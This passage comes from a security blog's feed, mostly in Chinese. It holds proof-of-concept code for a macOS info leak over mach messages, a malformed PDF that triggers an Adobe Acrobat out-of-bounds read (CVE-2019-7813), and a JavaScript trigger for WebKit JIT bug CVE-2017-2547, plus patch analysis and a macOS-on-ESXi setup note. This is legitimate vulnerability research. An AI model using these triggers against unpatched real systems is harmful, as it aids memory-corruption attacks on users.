class="line">4message.NDR = NDR_record;</span><br><span class="line">4message.size = <span class="number">0</span>;</span><br><span class="line">4message.leak_addr = <span class="number">0x1337</span>; <span class="comment">//if trigger leak bug successfully, it will be change to stack value.</span></span><br><span class="line">4ret = mach_msg(&amp;(message.header), MACH_SEND_MSG | MACH_RCV_MSG,</span><br><span class="line">44444<span class="number">36</span>, <span class="number">0xffff</span>, replyPort,</span><br><span class="line">44444MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</span><br><span class="line"></span><br><span class="line">4<span class="keyword">if</span>(ret != MACH_MSG_SUCCESS) &#123;</span><br><span class="line">44NSLog(@<span class="string">"mach_msg fail.\n"</span>);</span><br><span class="line">44mach_error(<span class="string">"mach_msg:"</span> , ret);</span><br><span class="line">4&#125;</span><br><span class="line">4stack_addr = <span class="number">0x7fff00000000</span> | message.leak_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写poc的时候发现一个问题，使用之前和<code>fontd</code>交互的代码获取port，然后填充<code>mach msg</code>的<code>remote port</code> 无法触发漏洞，问了下<a href="https://brightiup.me" target="_blank" rel="noopener">brightiup</a>得到了答案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你获取的这个port是这个mach服务的port，他这个代码里面通过funcptr获得的port是一个对象的port可以理解为一个上下文。其实那个funcptr应该是CGSCreateLayerContext函数。</span><br></pre></td></tr></table></figure><p>我获取到的port是没有上下文的，所以无法触发漏洞路径。</p><p>重新看了完整利用后，发现这个offset对应的函数应该是 <code>CGSGetConnectionPortById</code>。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://github.com/theori-io/zer0con2018_singi" target="_blank" rel="noopener">zer0con2018_singi</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;basic-info&quot;&gt;&lt;a href=&quot;#basic-info&quot; class=&quot;headerlink&quot; title=&quot;basic info&quot;&gt;&lt;/a&gt;basic info&lt;/h2&gt;&lt;p&gt;uninitialized stack var –&amp;gt; info leak&lt;br&gt;macOS 10.12.1&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="macOS" scheme="http://o0xmuhe.me/tags/macOS/"/>
    
  </entry>
  
  <entry>
    <title>find macOS service and it&#39;s plist file</title>
    <link href="http://o0xmuhe.me/2019/06/14/find-macOS-service-and-it-s-plist-file/"/>
    <id>http://o0xmuhe.me/2019/06/14/find-macOS-service-and-it-s-plist-file/</id>
    <published>2019-06-14T10:17:33.000Z</published>
    <updated>2019-06-14T10:30:21.756Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h2><p>find macOS service ‘s plist file.</p><p><code>com.apple.xxxx</code> —&gt; <code>xxxx.plist</code></p><a id="more"></a><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01 :"></a>0x01 :</h2><p>find all <code>*.plist</code> file and use <code>grep</code> to find target service, not the best way.</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02 :"></a>0x02 :</h2><p>use <code>procexp</code>.  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./procexp.universal all ports | service_name</span><br></pre></td></tr></table></figure><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03 :"></a>0x03 :</h2><p>this way is more complex than others, thx to <a href="https://brightiup.me" target="_blank" rel="noopener">brightiup</a> :)</p><ol><li><p>step 1</p><p>write a simple gadget, core logic as follow:</p></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bootstrap_look_up(bs_port, render_service_name, &amp;p);</span><br><span class="line">...</span><br><span class="line">mach_msg(&amp;m.header, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, <span class="keyword">sizeof</span>(message), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">...</span><br><span class="line">getchar(); <span class="comment">//do not exit untill we finish</span></span><br></pre></td></tr></table></figure><ol start="2"><li><p>step 2</p><p>get the pid of your gadget</p></li></ol><ol start="3"><li><p>Step 3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo lsmp -p pid</span><br></pre></td></tr></table></figure></li></ol><p>now, you can get the service name according to mach port, then find the plist file by service name you found.</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00:&quot;&gt;&lt;/a&gt;0x00:&lt;/h2&gt;&lt;p&gt;find macOS service ‘s plist file.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;com.apple.xxxx&lt;/code&gt; —&amp;gt; &lt;code&gt;xxxx.plist&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="macOS" scheme="http://o0xmuhe.me/tags/macOS/"/>
    
  </entry>
  
  <entry>
    <title>Adobe Acrobat DC Pro OOB(CVE-2019-7813)</title>
    <link href="http://o0xmuhe.me/2019/05/15/Adobe-Acrobat-DC-Pro-OOB-CVE-2019-7813/"/>
    <id>http://o0xmuhe.me/2019/05/15/Adobe-Acrobat-DC-Pro-OOB-CVE-2019-7813/</id>
    <published>2019-05-15T10:23:36.000Z</published>
    <updated>2019-05-15T10:31:52.367Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h4><p>Out-of-Bounds Read </p><a id="more"></a><h4 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">%PDF-1.7</span><br><span class="line"></span><br><span class="line">1 0 obj</span><br><span class="line">&lt;&lt;&gt;&gt;</span><br><span class="line">%endobj</span><br><span class="line"></span><br><span class="line">trailer</span><br><span class="line">&lt;&lt;</span><br><span class="line">/Root&lt;&lt;/Pages 1 0 R&gt;&gt;</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure><p>click <code>File</code>–&gt;<code>Properties</code></p><p>boring bug :(</p><h4 id="Patch-amp-amp-Bulletin"><a href="#Patch-amp-amp-Bulletin" class="headerlink" title="Patch &amp;&amp; Bulletin"></a>Patch &amp;&amp; Bulletin</h4><p><a href="https://helpx.adobe.com/security/products/acrobat/apsb19-18.html" target="_blank" rel="noopener">adobe psirt</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;Info&quot;&gt;&lt;a href=&quot;#Info&quot; class=&quot;headerlink&quot; title=&quot;Info&quot;&gt;&lt;/a&gt;Info&lt;/h4&gt;&lt;p&gt;Out-of-Bounds Read &lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Adobe" scheme="http://o0xmuhe.me/tags/Adobe/"/>
    
      <category term="PoC" scheme="http://o0xmuhe.me/tags/PoC/"/>
    
  </entry>
  
  <entry>
    <title>macOS on ESXi</title>
    <link href="http://o0xmuhe.me/2019/05/10/macOS-on-ESXi/"/>
    <id>http://o0xmuhe.me/2019/05/10/macOS-on-ESXi/</id>
    <published>2019-05-09T16:11:34.000Z</published>
    <updated>2019-05-09T16:24:39.572Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VMWare-ESXI-配置macOS虚拟机"><a href="#VMWare-ESXI-配置macOS虚拟机" class="headerlink" title="VMWare ESXI 配置macOS虚拟机"></a>VMWare ESXI 配置macOS虚拟机</h1><a id="more"></a><h2 id="需要的工具-ISO"><a href="#需要的工具-ISO" class="headerlink" title="需要的工具/ISO"></a>需要的工具/ISO</h2><p><a href="https://github.com/DrDonk/esxi-unlocker" target="_blank" rel="noopener">unlocker3.0</a></p><p>或者 <a href="https://github.com/o0xmuhe/macOS_on_ESXi" target="_blank" rel="noopener">unlocker</a></p><p>macOS的ISO自行下载</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="给esxi打补丁"><a href="#给esxi打补丁" class="headerlink" title="给esxi打补丁"></a>给esxi打补丁</h3><h4 id="1-unlocker3-0"><a href="#1-unlocker3-0" class="headerlink" title="1. unlocker3.0"></a>1. unlocker3.0</h4><ul><li><p>登陆网页端esxi管理，打开服务器的ssh服务。</p></li><li><p>在macOS的系统上构建好unlocker</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python esxi-build.py</span><br></pre></td></tr></table></figure><ul><li>ssh登陆进去，把上个步骤得到的所有东西上传到服务器。</li><li>打补丁</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf esxi-unlocker-300.tgz</span><br><span class="line">chmod a+x *.sh</span><br><span class="line">./esxi-install.sh</span><br><span class="line"><span class="comment"># then reboot your server</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><h4 id="2-其他版本unlocker"><a href="#2-其他版本unlocker" class="headerlink" title="2.  其他版本unlocker"></a>2.  其他版本unlocker</h4><p>直接复制到服务器，然后执行<code>esxi-install.sh</code>，随后重启服务器。</p><h3 id="安装vm"><a href="#安装vm" class="headerlink" title="安装vm"></a><del>安装vm</del></h3><p>这里esxi的版本是6.7，按理说兼容6.5。</p><p>直接把镜像上传到服务器上，然后直接新建vm。</p><p>但是这里得到报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smc read error k0 esxi xxxxx</span><br></pre></td></tr></table></figure><p>无法解决。</p><h3 id="导入ovf"><a href="#导入ovf" class="headerlink" title="导入ovf"></a><del>导入ovf</del></h3><p>使用低版本vm workstation(12)，选择兼容性esxi 6.5，建立一个macos的虚拟机，然后导出ovf，然后部署到服务器上。</p><p>这里注意：<strong>导出前移除光驱加载的镜像</strong>，否则部署会失败。</p><p>这种方式，能部署上去，但是无限重启，内核无法加载起来。</p><h3 id="安装vm-plan-B"><a href="#安装vm-plan-B" class="headerlink" title="安装vm plan B"></a>安装vm plan B</h3><p>更换了<a href="https://github.com/o0xmuhe/macOS_on_ESXi" target="_blank" rel="noopener">unlocker</a>的补丁，就能正常安装了。</p><p>这里看起来应该是unlocker补丁的问题 - -。 玄学</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;VMWare-ESXI-配置macOS虚拟机&quot;&gt;&lt;a href=&quot;#VMWare-ESXI-配置macOS虚拟机&quot; class=&quot;headerlink&quot; title=&quot;VMWare ESXI 配置macOS虚拟机&quot;&gt;&lt;/a&gt;VMWare ESXI 配置macOS虚拟机&lt;/h1&gt;
    
    </summary>
    
    
    
      <category term="macOS" scheme="http://o0xmuhe.me/tags/macOS/"/>
    
      <category term="环境配置" scheme="http://o0xmuhe.me/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
      <category term="ESXi" scheme="http://o0xmuhe.me/tags/ESXi/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-2547 分析</title>
    <link href="http://o0xmuhe.me/2019/04/20/CVE-2017-2547-%E5%88%86%E6%9E%90/"/>
    <id>http://o0xmuhe.me/2019/04/20/CVE-2017-2547-%E5%88%86%E6%9E%90/</id>
    <published>2019-04-20T08:33:09.000Z</published>
    <updated>2019-04-20T08:41:55.195Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2017-2547-分析"><a href="#CVE-2017-2547-分析" class="headerlink" title="CVE-2017-2547 分析 "></a>CVE-2017-2547 分析 </h1><p><code>jit bug</code></p><p>缺少边界检查导致的越界读.</p><a id="more"></a><h2 id="0x00-PoC"><a href="#0x00-PoC" class="headerlink" title="0x00 : PoC"></a>0x00 : PoC</h2><p>loki的poc</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100000</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">parseInt</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    arr[<span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line">    arr[<span class="number">-0x12345678</span>] = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f();</span><br></pre></td></tr></table></figure><p> Tencent Team Sniper的poc</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2017-2547%20%E5%88%86%E6%9E%90/15557298780096.jpg" alt=""></p><p>3.5448480588962e-310 就是  0x414141414140</p><h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 : 前置知识"></a>0x01 : 前置知识</h2><p>DFG JIT :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DFG JIT 的使用前提是函数至少呗调用60次，或者循环执行至少1000次，或者2者同权值组合。</span><br></pre></td></tr></table></figure><h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 : 分析"></a>0x02 : 分析</h2><p>问题发生在DFG JIT中，访问数组的时候因为缺少必要的边界检查，导致越界访问，当然这个洞可以转化成读/写内存，然后导致rce。</p><p>直接看代码：<br><code>git show f2476d46820b744450133f6b00a85e5265db1915</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">     RangeKind m_kind;</span><br><span class="line">@@ <span class="number">-249</span>,<span class="number">7</span> +<span class="number">258</span>,<span class="number">13</span> @@ <span class="keyword">private</span>:</span><br><span class="line">                     Node* maxNode;</span><br><span class="line"></span><br><span class="line">                     <span class="keyword">if</span> (!data.m_key.m_source) &#123;</span><br><span class="line">-                        minNode = <span class="number">0</span>;</span><br><span class="line">+                        <span class="comment">// data.m_key.m_source being null means that we're comparing against int32 constants (see rangeKeyAndAddend()).</span></span><br><span class="line">+                        <span class="comment">// Since CheckInBounds does an unsigned comparison, if the minBound &gt;= 0, it is also covered by the</span></span><br><span class="line">+                        <span class="comment">// maxBound comparison. However, if minBound &lt; 0, then CheckInBounds should always fail its speculation check.</span></span><br><span class="line">+                        <span class="comment">// We'll force an OSR exit in that case.</span></span><br><span class="line">+                        minNode = <span class="literal">nullptr</span>;</span><br><span class="line">+                        <span class="keyword">if</span> (range.m_minBound &lt; <span class="number">0</span>)</span><br><span class="line">+                            m_insertionSet.insertNode(nodeIndex, SpecNone, ForceOSRExit, node-&gt;origin);</span><br><span class="line">                         maxNode = m_insertionSet.insertConstant(</span><br><span class="line">                             nodeIndex, maxOrigin, jsNumber(range.m_maxBound));</span><br><span class="line">                     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">(END)</span><br></pre></td></tr></table></figure><p>这里看到的逻辑太少，直接去源码里找：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ArrayBounds: &#123;</span><br><span class="line">    Node* minNode;</span><br><span class="line">    Node* maxNode;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!data.m_key.m_source) &#123;</span><br><span class="line">        <span class="comment">// data.m_key.m_source being null means that we're comparing against int32 constants (see rangeKeyAndAddend()).</span></span><br><span class="line">        <span class="comment">// Since CheckInBounds does an unsigned comparison, if the minBound &gt;= 0, it is also covered by the</span></span><br><span class="line">        <span class="comment">// maxBound comparison. However, if minBound &lt; 0, then CheckInBounds should always fail its speculation check.</span></span><br><span class="line">        <span class="comment">// We'll force an OSR exit in that case.</span></span><br><span class="line">        minNode = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span> (range.m_minBound &lt; <span class="number">0</span>)</span><br><span class="line">            m_insertionSet.insertNode(nodeIndex, SpecNone, ForceOSRExit, node-&gt;origin);</span><br><span class="line">        maxNode = m_insertionSet.insertConstant(</span><br><span class="line">            nodeIndex, maxOrigin, jsNumber(range.m_maxBound));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        minNode = insertAdd(</span><br><span class="line">            nodeIndex, minOrigin, data.m_key.m_source, range.m_minBound,</span><br><span class="line">            Arith::Unchecked);</span><br><span class="line">        maxNode = insertAdd(</span><br><span class="line">            nodeIndex, maxOrigin, data.m_key.m_source, range.m_maxBound,</span><br><span class="line">            Arith::Unchecked);</span><br><span class="line">    &#125;</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure><p>这里是为了确定要访问的数组的边界，每次访问确定最大和最小值，为了后面消除冗余节点。（比如，多次访问这个array的时候，访问了10，又访问了20，那么代码做检查的时候肯定只会检测是不是大于20，而不会再检查是否大于10）。<br>在未patch的时候，边界检查的时Array的最小值是否是负数是没有做检测的，按照原来的逻辑：</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2017-2547%20%E5%88%86%E6%9E%90/15557483590968.jpg" alt=""></p><p>如果如果min给个负数，那么后面的边界检查只有对max值的检查，也就是说这里可以给一个负的下标，从而造成越界访问。</p><p>那么PoC就很容易看懂了， 让js代码多次执行，make hot进入DFG JIT的优化流程，在访问数组时数组下标给一个负数，由于没有做边界检查，所以会导致越界读。</p><h2 id="0x03-Patch"><a href="#0x03-Patch" class="headerlink" title="0x03 : Patch"></a>0x03 : Patch</h2><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2017-2547%20%E5%88%86%E6%9E%90/15557474317852.jpg" alt=""></p><p>Patch代码的话，也很简单，增加了min是否是负数的检测，是的话就退出DFG优化，回退到更低一层的优化，去做更多的检查 ：）</p><h2 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 : Reference"></a>0x04 : Reference</h2><p><a href="https://www.thezdi.com/blog/2017/8/24/deconstructing-a-winning-webkit-pwn2own-entry" target="_blank" rel="noopener">DECONSTRUCTING A WINNING WEBKIT PWN2OWN ENTRY</a></p><p><a href="https://sourcegraph.com/github.com/WebKit/webkit/-/blob/Source/JavaScriptCore/dfg/DFGIntegerCheckCombiningPhase.cpp#L240" target="_blank" rel="noopener">source code</a></p><p><a href="https://www.jianshu.com/p/1a728e38ceaa" target="_blank" rel="noopener">JavascriptCore四层结构</a></p><p><a href="https://github.com/tunz/js-vuln-db/blob/master/jsc/CVE-2017-2547.md" target="_blank" rel="noopener">js-vuln-db</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;CVE-2017-2547-分析&quot;&gt;&lt;a href=&quot;#CVE-2017-2547-分析&quot; class=&quot;headerlink&quot; title=&quot;CVE-2017-2547 分析 &quot;&gt;&lt;/a&gt;CVE-2017-2547 分析 &lt;/h1&gt;&lt;p&gt;&lt;code&gt;jit bug&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;缺少边界检查导致的越界读.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="漏洞分析" scheme="http://o0xmuhe.me/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="webkit" scheme="http://o0xmuhe.me/tags/webkit/"/>
    
  </entry>
  
</feed>
